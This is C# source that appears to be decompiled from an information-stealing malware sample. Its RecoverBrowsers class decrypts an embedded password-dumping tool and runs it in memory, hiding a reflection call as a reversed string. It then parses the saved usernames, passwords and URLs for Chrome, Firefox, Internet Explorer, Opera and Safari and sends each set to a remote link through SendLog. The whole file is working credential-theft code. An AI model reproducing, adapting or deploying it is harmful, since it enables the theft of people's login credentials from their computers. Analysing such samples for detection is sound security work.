using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class RecoverBrowsers
{
	private string R_List;

	public RecoverBrowsers()
	{
		R_List = ReadFile();
	}

	public void Chrome()
	{
		FandS("Chrome");
	}

	public void Firefox()
	{
		FandS("Firefox");
	}

	public void InternetExplorer()
	{
		FandS("Internet Explorer");
	}

	public void Opera()
	{
		FandS("Opera");
	}

	public void Safari()
	{
		FandS("Safari");
	}

	public void FandS(string Browser)
	{
		try
		{
			int count = Regex.Matches(R_List, Regex.Escape("URL")).Count;
			for (int i = 0; i < count; i = checked(i + 1))
			{
				string between = GetBetween(R_List, "User Name         : ", "Password          : ", i);
				string between2 = GetBetween(R_List, "Password          : ", "Password Strength : ", i);
				string between3 = GetBetween(R_List, "URL               : ", "Web Browser       : ", i);
				string between4 = GetBetween(R_List, "Web Browser       : ", "User Name         : ", i);
				if (Contains(between4, Browser))
				{
					Send.SendLog(KidMode.P_Link, "Passwords", null, null, between4, between3, between, between2, null);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool Contains(string NameInList, string Compare)
	{
		if (NameInList.Contains(Compare))
		{
			return true;
		}
		return false;
	}

	public string ReadFile()
	{
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		string result = null;
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Browsers.txt");
		try
		{
			if (!File.Exists(path))
			{
				Assembly assembly = (Assembly)typeof(Assembly).GetMethod(Strings.StrReverse("ylbmessAgnitucexEteG"))!.Invoke(null, null);
				new ResourceManager("Key", assembly);
				byte[] bytes = Encoding.Unicode.GetBytes("version1.6");
				string text = "/stext " + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Browsers.txt");
				byte[] _Bytes = KidMode.GetData("7a27586dc8134e169a1dc116ed159cd5jeffjef");
				string _Class = "MemoryEx";
				string _Sub = "Execute";
				object _Parameters = new object[4]
				{
					Application.get_ExecutablePath(),
					text,
					Encryption.RSMDecrypt(KidMode.GetData("RecoverBrowsers"), bytes),
					false
				};
				KidMode.InvokeDll(ref _Bytes, ref _Class, ref _Sub, ref _Parameters);
				while (!File.Exists(path))
				{
					Thread.Sleep(1000);
				}
			}
			result = File.ReadAllText(path);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public string GetBetween(string input, string str1, string str2, int ind)
	{
		string input2 = Regex.Split(input, str1)[checked(ind + 1)];
		return Regex.Split(input2, str2)[0];
	}
}
